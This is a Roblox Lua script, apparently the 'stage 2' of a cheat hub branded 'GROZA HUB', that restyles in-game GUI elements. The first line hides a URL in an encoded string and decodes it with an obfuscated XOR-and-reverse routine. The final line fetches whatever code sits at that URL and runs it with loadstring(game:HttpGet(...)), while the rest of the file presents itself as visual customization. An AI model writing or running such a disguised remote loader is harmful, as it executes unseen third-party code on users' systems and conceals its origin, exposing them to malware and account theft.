
--[[ STAGE 2: VISUAL CORE ]]
local TrNLB11jH2QOXXKF7u="\012\025\030\037\047\018\119\060\065\061\069\139\059\074\081\081\098\163\083\100\101\096\183\121\101\133\115\129\144\139\145\121\223\205\212\171\177\168\174\187\156\003\197\203\203\020\190\220\213\202\232\235\235\224\237\231\229\000\237\014\246\021\015\092\007\029\020\107\111\104\035\038\038\042\074"local p9usyUIkTjxuE=85 local wrQX1A3O7KvT0E5=210 local GxWWUpxKep5HSNIX4iS9=0 local EmIeRs82B0qRr7H=4 local wUizLxVRzNZQw2bCb3=15 local VAQZXgORVxbtcnw_weTJlL=true local jMf4NEcvB7EBWxOJ7=bit32 and bit32.bxor if not jMf4NEcvB7EBWxOJ7 then jMf4NEcvB7EBWxOJ7=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local AUvPLMU7xN0XMGFnCVGkP={}for OzzUQkRRmINR=1,#TrNLB11jH2QOXXKF7u do local dwHdjpADYzrHQhiD=string.byte(TrNLB11jH2QOXXKF7u,OzzUQkRRmINR)local RVEPK4sRboEAH1ymgGZR5=(wrQX1A3O7KvT0E5+(OzzUQkRRmINR*EmIeRs82B0qRr7H)+wUizLxVRzNZQw2bCb3)%256 if GxWWUpxKep5HSNIX4iS9==0 then dwHdjpADYzrHQhiD=(dwHdjpADYzrHQhiD-RVEPK4sRboEAH1ymgGZR5)%256 AUvPLMU7xN0XMGFnCVGkP[OzzUQkRRmINR]=string.char(jMf4NEcvB7EBWxOJ7(dwHdjpADYzrHQhiD,p9usyUIkTjxuE))else dwHdjpADYzrHQhiD=jMf4NEcvB7EBWxOJ7(dwHdjpADYzrHQhiD,p9usyUIkTjxuE)AUvPLMU7xN0XMGFnCVGkP[OzzUQkRRmINR]=string.char((dwHdjpADYzrHQhiD-RVEPK4sRboEAH1ymgGZR5)%256)end end local gebXyQCeDh92a=table.concat(AUvPLMU7xN0XMGFnCVGkP)if VAQZXgORVxbtcnw_weTJlL then gebXyQCeDh92a=string.reverse(gebXyQCeDh92a)end local UP2ncVXXQQmYFI=gebXyQCeDh92a
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(UP2ncVXXQQmYFI))()
